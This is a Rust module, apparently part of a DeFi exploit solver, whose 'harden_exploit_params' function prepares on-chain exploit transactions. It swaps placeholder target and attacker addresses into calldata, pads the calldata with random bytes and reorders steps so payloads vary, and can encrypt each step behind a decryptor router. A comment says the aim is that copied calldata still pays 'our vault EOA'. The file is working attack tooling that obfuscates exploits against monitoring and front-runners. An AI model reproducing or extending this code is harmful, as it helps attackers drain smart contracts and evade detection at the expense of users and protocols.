use crate::solver::objectives::ExploitParams;
use crate::solver::setup::{ATTACKER, TARGET};
use alloy::primitives::{keccak256, Address, Bytes};
use std::collections::{BTreeMap, HashSet};
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{SystemTime, UNIX_EPOCH};

const DEFAULT_POLYMORPHIC_MAX_TAIL_BYTES: usize = 16;
static POLYMORPHIC_COUNTER: AtomicU64 = AtomicU64::new(0);

fn load_payload_polymorphism_enabled() -> bool {
    std::env::var("PAYLOAD_POLYMORPHISM_ENABLED")
        .ok()
        .map(|v| {
            matches!(
                v.trim().to_ascii_lowercase().as_str(),
                "1" | "true" | "yes" | "on"
            )
        })
        .unwrap_or(true)
}

fn load_payload_polymorphic_max_tail_bytes() -> usize {
    std::env::var("PAYLOAD_POLYMORPHIC_MAX_TAIL_BYTES")
        .ok()
        .and_then(|raw| raw.trim().parse::<usize>().ok())
        .unwrap_or(DEFAULT_POLYMORPHIC_MAX_TAIL_BYTES)
        .min(128)
}

fn load_payload_polymorphic_reorder_independent_steps() -> bool {
    std::env::var("PAYLOAD_POLYMORPHIC_REORDER_INDEPENDENT_STEPS")
        .ok()
        .map(|v| {
            matches!(
                v.trim().to_ascii_lowercase().as_str(),
                "1" | "true" | "yes" | "on"
            )
        })
        .unwrap_or(true)
}

fn load_payload_encryption_enabled() -> bool {
    std::env::var("PAYLOAD_ENCRYPTION_ENABLED")
        .ok()
        .map(|v| {
            matches!(
                v.trim().to_ascii_lowercase().as_str(),
                "1" | "true" | "yes" | "on"
            )
        })
        .unwrap_or(false)
}

fn load_payload_encryption_epoch_secs() -> u64 {
    std::env::var("PAYLOAD_ENCRYPTION_EPOCH_SECS")
        .ok()
        .and_then(|raw| raw.trim().parse::<u64>().ok())
        .map(|v| v.clamp(30, 86_400))
        .unwrap_or(300)
}

fn load_payload_decryptor_router() -> Option<Address> {
    std::env::var("PAYLOAD_DECRYPTOR_ROUTER")
        .ok()
        .and_then(|raw| raw.trim().parse::<Address>().ok())
}

fn load_payload_encryption_key() -> Option<[u8; 32]> {
    let raw = std::env::var("PAYLOAD_ENCRYPTION_KEY_HEX").ok()?;
    let clean = raw.trim().trim_start_matches("0x").trim_start_matches("0X");
    if clean.len() != 64 {
        return None;
    }
    let mut out = [0u8; 32];
    hex::decode_to_slice(clean, &mut out).ok()?;
    Some(out)
}

fn now_nanos() -> u128 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .ok()
        .map(|d| d.as_nanos())
        .unwrap_or(0)
}

fn now_secs() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .ok()
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

fn polymorphic_entropy(params: &ExploitParams, step_index: usize) -> [u8; 32] {
    let step = match params.steps.get(step_index) {
        Some(step) => step,
        None => return keccak256([0u8; 8]).0,
    };
    let mut seed = Vec::with_capacity(96 + step.call_data.len().min(96));
    seed.extend_from_slice(&now_nanos().to_le_bytes());
    seed.extend_from_slice(
        &POLYMORPHIC_COUNTER
            .fetch_add(1, Ordering::Relaxed)
            .to_le_bytes(),
    );
    seed.extend_from_slice(&(step_index as u64).to_le_bytes());
    seed.extend_from_slice(step.target.as_slice());
    let selector = if step.call_data.len() >= 4 {
        &step.call_data[0..4]
    } else {
        &[0u8; 4]
    };
    seed.extend_from_slice(selector);
    let sample_len = step.call_data.len().min(96);
    seed.extend_from_slice(&step.call_data[..sample_len]);
    keccak256(seed).0
}

fn append_polymorphic_tail_padding(
    mut data: Bytes,
    entropy: &[u8; 32],
    max_tail_bytes: usize,
) -> Bytes {
    // Only mutate canonical ABI-like blobs (selector + whole 32-byte words).
    if data.len() < 4 || !(data.len() - 4).is_multiple_of(32) || max_tail_bytes == 0 {
        return data;
    }

    let tail_len = 1 + (usize::from(entropy[0]) % max_tail_bytes);
    let mut buf = data.to_vec();
    for i in 0..tail_len {
        buf.push(entropy[1 + (i % 31)]);
    }
    data = Bytes::from(buf);
    data
}

fn maybe_reorder_independent_steps(mut params: ExploitParams) -> ExploitParams {
    if !load_payload_polymorphic_reorder_independent_steps() || params.steps.len() < 2 {
        return params;
    }

    let offsets = params
        .block_offsets
        .clone()
        .unwrap_or_else(|| vec![0; params.steps.len()]);
    if offsets.len() != params.steps.len() {
        return params;
    }

    let mut by_offset: BTreeMap<u64, Vec<usize>> = BTreeMap::new();
    for (idx, offset) in offsets.iter().copied().enumerate() {
        by_offset.entry(offset).or_default().push(idx);
    }

    for indices in by_offset.values() {
        if indices.len() < 2 {
            continue;
        }
        if indices.iter().any(|idx| {
            params
                .steps
                .get(*idx)
                .and_then(|s| s.execute_if.as_ref())
                .is_some()
        }) {
            continue;
        }
        let mut seen_targets = HashSet::with_capacity(indices.len());
        let mut unique_targets = true;
        for idx in indices {
            let Some(step) = params.steps.get(*idx) else {
                unique_targets = false;
                break;
            };
            if !seen_targets.insert(step.target) {
                unique_targets = false;
                break;
            }
        }
        if !unique_targets {
            continue;
        }

        let mut ranked = Vec::with_capacity(indices.len());
        for idx in indices {
            let entropy = polymorphic_entropy(&params, *idx);
            ranked.push((entropy, params.steps[*idx].clone()));
        }
        ranked.sort_by(|a, b| a.0.cmp(&b.0));

        for (pos, idx) in indices.iter().copied().enumerate() {
            if let Some((_, step)) = ranked.get(pos) {
                params.steps[idx] = step.clone();
            }
        }
    }

    params
}

fn is_abi_address_word(word: &[u8; 32], addr: Address) -> bool {
    // Standard ABI encoding for address is left-padded with 12 zero bytes.
    if word[0..12] != [0u8; 12] {
        return false;
    }
    word[12..32] == addr.0
}

fn patch_abi_address_words(mut data: Bytes, from: Address, to: Address) -> Bytes {
    if data.len() < 4 + 32 {
        return data;
    }
    let mut buf = data.to_vec();
    let mut offset = 4usize;
    while offset + 32 <= buf.len() {
        let mut word = [0u8; 32];
        word.copy_from_slice(&buf[offset..offset + 32]);
        if is_abi_address_word(&word, from) {
            buf[offset + 12..offset + 32].copy_from_slice(to.0.as_slice());
        }
        offset += 32;
    }
    data = Bytes::from(buf);
    data
}

fn xor_stream_encrypt(input: &[u8], key: &[u8; 32], nonce: &[u8; 32]) -> Vec<u8> {
    let mut out = vec![0u8; input.len()];
    let mut counter = 0u64;
    let mut offset = 0usize;
    while offset < input.len() {
        let mut seed = Vec::with_capacity(72);
        seed.extend_from_slice(key);
        seed.extend_from_slice(nonce);
        seed.extend_from_slice(&counter.to_le_bytes());
        let stream = keccak256(seed).0;
        let take = (input.len() - offset).min(32);
        for i in 0..take {
            out[offset + i] = input[offset + i] ^ stream[i];
        }
        offset += take;
        counter = counter.saturating_add(1);
    }
    out
}

fn encode_u64_word(v: u64) -> [u8; 32] {
    let mut w = [0u8; 32];
    w[24..32].copy_from_slice(&v.to_be_bytes());
    w
}

fn encode_address_word(addr: Address) -> [u8; 32] {
    let mut w = [0u8; 32];
    w[12..32].copy_from_slice(addr.as_slice());
    w
}

fn encode_u256_word(v: usize) -> [u8; 32] {
    let mut w = [0u8; 32];
    let bytes = (v as u128).to_be_bytes();
    w[16..32].copy_from_slice(&bytes);
    w
}

fn encode_execute_encrypted(
    target: Address,
    epoch: u64,
    key_commit: [u8; 32],
    ciphertext: &[u8],
) -> Bytes {
    // executeEncrypted(address,uint64,bytes32,bytes)
    let selector = &keccak256(b"executeEncrypted(address,uint64,bytes32,bytes)").0[..4];
    let mut out = Vec::with_capacity(4 + 32 * 5 + ciphertext.len() + 32);
    out.extend_from_slice(selector);
    out.extend_from_slice(&encode_address_word(target));
    out.extend_from_slice(&encode_u64_word(epoch));
    out.extend_from_slice(&key_commit);
    // Dynamic bytes offset starts after 4 fixed words.
    out.extend_from_slice(&encode_u256_word(32 * 4));
    out.extend_from_slice(&encode_u256_word(ciphertext.len()));
    out.extend_from_slice(ciphertext);
    let rem = out.len() % 32;
    if rem != 0 {
        out.extend(std::iter::repeat_n(0u8, 32 - rem));
    }
    Bytes::from(out)
}

fn maybe_encrypt_step_payloads(mut params: ExploitParams) -> ExploitParams {
    if !load_payload_encryption_enabled() {
        return params;
    }
    let Some(router) = load_payload_decryptor_router() else {
        return params;
    };
    let Some(key) = load_payload_encryption_key() else {
        return params;
    };

    let epoch = now_secs().saturating_div(load_payload_encryption_epoch_secs().max(1));
    let mut commit_seed = Vec::with_capacity(40);
    commit_seed.extend_from_slice(&key);
    commit_seed.extend_from_slice(&epoch.to_be_bytes());
    let key_commit = keccak256(commit_seed).0;

    for (idx, step) in params.steps.iter_mut().enumerate() {
        let mut nonce_seed = Vec::with_capacity(64);
        nonce_seed.extend_from_slice(step.target.as_slice());
        nonce_seed.extend_from_slice(&epoch.to_be_bytes());
        nonce_seed.extend_from_slice(&(idx as u64).to_be_bytes());
        let nonce = keccak256(nonce_seed).0;
        let ciphertext = xor_stream_encrypt(step.call_data.as_ref(), &key, &nonce);
        let wrapped = encode_execute_encrypted(step.target, epoch, key_commit, &ciphertext);
        step.target = router;
        step.call_data = wrapped;
    }
    params
}

/// Automated payload hardening:
/// - Resolve `TARGET` and `ATTACKER` sentinels inside calldata ABI address words.
/// - Ensures copied calldata does not pay the copier (recipient stays bound to our vault EOA).
pub fn harden_exploit_params(
    mut params: ExploitParams,
    target: Address,
    attacker: Address,
) -> ExploitParams {
    if load_payload_polymorphism_enabled() {
        let max_tail_bytes = load_payload_polymorphic_max_tail_bytes();
        for idx in 0..params.steps.len() {
            let entropy = polymorphic_entropy(&params, idx);
            if let Some(step) = params.steps.get_mut(idx) {
                step.call_data = append_polymorphic_tail_padding(
                    step.call_data.clone(),
                    &entropy,
                    max_tail_bytes,
                );
            }
        }
        params = maybe_reorder_independent_steps(params);
    }
    for step in &mut params.steps {
        if step.target == TARGET {
            step.target = target;
        }
        let patched_target = patch_abi_address_words(step.call_data.clone(), TARGET, target);
        let patched_attacker = patch_abi_address_words(patched_target, ATTACKER, attacker);
        step.call_data = patched_attacker;
    }
    maybe_encrypt_step_payloads(params)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::solver::objectives::{ExploitStep, FlashLoanLeg};
    use std::sync::{Mutex, OnceLock};

    fn payload_env_lock() -> &'static Mutex<()> {
        static LOCK: OnceLock<Mutex<()>> = OnceLock::new();
        LOCK.get_or_init(|| Mutex::new(()))
    }

    fn sample_params() -> ExploitParams {
        ExploitParams {
            flash_loan_amount: revm::primitives::U256::ZERO,
            flash_loan_token: Address::ZERO,
            flash_loan_provider: Address::ZERO,
            flash_loan_legs: Vec::<FlashLoanLeg>::new(),
            steps: vec![
                ExploitStep {
                    target: Address::repeat_byte(0x11),
                    // selector + one 32-byte ABI word
                    call_data: Bytes::from(
                        vec![0xaa, 0xbb, 0xcc, 0xdd]
                            .into_iter()
                            .chain([0u8; 32])
                            .collect::<Vec<_>>(),
                    ),
                    execute_if: None,
                },
                ExploitStep {
                    target: Address::repeat_byte(0x22),
                    call_data: Bytes::from(
                        vec![0x11, 0x22, 0x33, 0x44]
                            .into_iter()
                            .chain([0u8; 32])
                            .collect::<Vec<_>>(),
                    ),
                    execute_if: None,
                },
            ],
            expected_profit: None,
            block_offsets: Some(vec![0, 0]),
        }
    }

    #[test]
    fn test_polymorphic_tail_padding_keeps_selector_and_extends() {
        let _guard = payload_env_lock().lock().unwrap();
        std::env::set_var("PAYLOAD_POLYMORPHISM_ENABLED", "1");
        std::env::set_var("PAYLOAD_POLYMORPHIC_MAX_TAIL_BYTES", "8");
        std::env::set_var("PAYLOAD_POLYMORPHIC_REORDER_INDEPENDENT_STEPS", "0");
        std::env::set_var("PAYLOAD_ENCRYPTION_ENABLED", "0");
        std::env::remove_var("PAYLOAD_DECRYPTOR_ROUTER");
        std::env::remove_var("PAYLOAD_ENCRYPTION_KEY_HEX");

        let params = sample_params();
        let out = harden_exploit_params(params.clone(), Address::ZERO, Address::ZERO);
        assert_eq!(out.steps.len(), params.steps.len());
        for (before, after) in params.steps.iter().zip(out.steps.iter()) {
            assert!(after.call_data.len() >= before.call_data.len());
            assert_eq!(&after.call_data[..4], &before.call_data[..4]);
        }
    }

    #[test]
    fn test_polymorphic_reorder_preserves_step_count_and_offsets() {
        let _guard = payload_env_lock().lock().unwrap();
        std::env::set_var("PAYLOAD_POLYMORPHISM_ENABLED", "1");
        std::env::set_var("PAYLOAD_POLYMORPHIC_REORDER_INDEPENDENT_STEPS", "1");
        std::env::set_var("PAYLOAD_ENCRYPTION_ENABLED", "0");
        std::env::remove_var("PAYLOAD_DECRYPTOR_ROUTER");
        std::env::remove_var("PAYLOAD_ENCRYPTION_KEY_HEX");

        let params = sample_params();
        let out = harden_exploit_params(params.clone(), Address::ZERO, Address::ZERO);
        assert_eq!(out.steps.len(), params.steps.len());
        assert_eq!(out.block_offsets, params.block_offsets);
    }

    #[test]
    fn test_payload_encryption_wraps_step_when_enabled() {
        let _guard = payload_env_lock().lock().unwrap();
        std::env::set_var("PAYLOAD_POLYMORPHISM_ENABLED", "0");
        std::env::set_var("PAYLOAD_ENCRYPTION_ENABLED", "1");
        std::env::set_var(
            "PAYLOAD_DECRYPTOR_ROUTER",
            "0x1111111111111111111111111111111111111111",
        );
        std::env::set_var(
            "PAYLOAD_ENCRYPTION_KEY_HEX",
            "0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f20",
        );
        std::env::set_var("PAYLOAD_ENCRYPTION_EPOCH_SECS", "300");

        let params = sample_params();
        let out = harden_exploit_params(params.clone(), Address::ZERO, Address::ZERO);
        assert_eq!(
            out.steps[0].target,
            "0x1111111111111111111111111111111111111111"
                .parse::<Address>()
                .unwrap()
        );
        assert!(out.steps[0].call_data.len() > params.steps[0].call_data.len());
        assert_eq!(
            &out.steps[0].call_data[..4],
            &keccak256(b"executeEncrypted(address,uint64,bytes32,bytes)").0[..4]
        );
    }
}
